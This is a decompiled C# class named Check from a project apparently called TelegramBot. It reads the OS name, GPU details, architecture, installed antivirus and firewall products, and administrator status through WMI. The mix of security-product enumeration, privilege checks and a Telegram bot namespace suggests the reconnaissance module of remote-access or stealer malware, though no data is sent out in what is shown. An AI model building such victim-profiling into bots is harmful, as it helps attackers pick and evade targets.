using System;
using System.Management;
using System.Security.Principal;

namespace TelegramBot.Main
{
	// Token: 0x02000101 RID: 257
	internal class Check
	{
		// Token: 0x1700001E RID: 30
		// (get) Token: 0x06000366 RID: 870 RVA: 0x0002713C File Offset: 0x0002533C
		public static string OSName
		{
			get
			{
				string result;
				try
				{
					using (ManagementObjectCollection managementObjectCollection = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_OperatingSystem").Get())
					{
						using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectCollection.GetEnumerator())
						{
							if (enumerator.MoveNext())
							{
								object obj = enumerator.Current["Caption"];
								return (obj != null) ? obj.ToString() : null;
							}
						}
						result = null;
					}
				}
				catch
				{
					result = "Unknown";
				}
				return result;
			}
		}

		// Token: 0x1700001F RID: 31
		// (get) Token: 0x06000367 RID: 871 RVA: 0x000271DC File Offset: 0x000253DC
		public static string VideoController
		{
			get
			{
				string text = "¯\\(°_o)/¯";
				string result;
				try
				{
					using (ManagementObjectCollection managementObjectCollection = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
						{
							object obj = managementBaseObject["Caption"];
							text = ((obj != null) ? obj.ToString() : null);
						}
					}
					result = text;
				}
				catch
				{
					result = text;
				}
				return result;
			}
		}

		// Token: 0x17000020 RID: 32
		// (get) Token: 0x06000368 RID: 872 RVA: 0x0002727C File Offset: 0x0002547C
		public static string VideoMemory
		{
			get
			{
				string text = "¯\\_(ツ)_/¯";
				string result;
				try
				{
					using (ManagementObjectCollection managementObjectCollection = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
						{
							if (Convert.ToDouble(managementBaseObject["AdapterRam"]) / 1048576.0 % 1024.0 == 0.0)
							{
								text = Convert.ToDouble(managementBaseObject.Properties["AdapterRam"].Value) / 1048576.0 / 1024.0 + " GB";
							}
							else
							{
								text = (Convert.ToDouble(managementBaseObject.Properties["AdapterRam"].Value) / 1048576.0).ToString("F2") + " MB";
							}
						}
					}
					result = text;
				}
				catch
				{
					result = text;
				}
				return result;
			}
		}

		// Token: 0x17000021 RID: 33
		// (get) Token: 0x06000369 RID: 873 RVA: 0x000273BC File Offset: 0x000255BC
		public static string Bit
		{
			get
			{
				string result;
				try
				{
					if (Environment.Is64BitOperatingSystem)
					{
						result = "x64";
					}
					else
					{
						result = "x86";
					}
				}
				catch
				{
					result = "Not state";
				}
				return result;
			}
		}

		// Token: 0x17000022 RID: 34
		// (get) Token: 0x0600036A RID: 874 RVA: 0x000273FC File Offset: 0x000255FC
		public static string AV
		{
			get
			{
				string result;
				try
				{
					using (ManagementObjectCollection managementObjectCollection = new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM AntiVirusProduct").Get())
					{
						using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectCollection.GetEnumerator())
						{
							if (enumerator.MoveNext())
							{
								object obj = enumerator.Current["displayName"];
								return (obj != null) ? obj.ToString() : null;
							}
						}
						result = "Нет";
					}
				}
				catch
				{
					result = "Нет";
				}
				return result;
			}
		}

		// Token: 0x17000023 RID: 35
		// (get) Token: 0x0600036B RID: 875 RVA: 0x000274A0 File Offset: 0x000256A0
		public static string Firewall
		{
			get
			{
				string result;
				try
				{
					using (ManagementObjectCollection managementObjectCollection = new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM FirewallProduct").Get())
					{
						using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectCollection.GetEnumerator())
						{
							if (enumerator.MoveNext())
							{
								object obj = enumerator.Current["displayName"];
								return (obj != null) ? obj.ToString() : null;
							}
						}
						result = "Нет";
					}
				}
				catch
				{
					result = "Нет";
				}
				return result;
			}
		}

		// Token: 0x0400058E RID: 1422
		public static bool Acess = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}
}
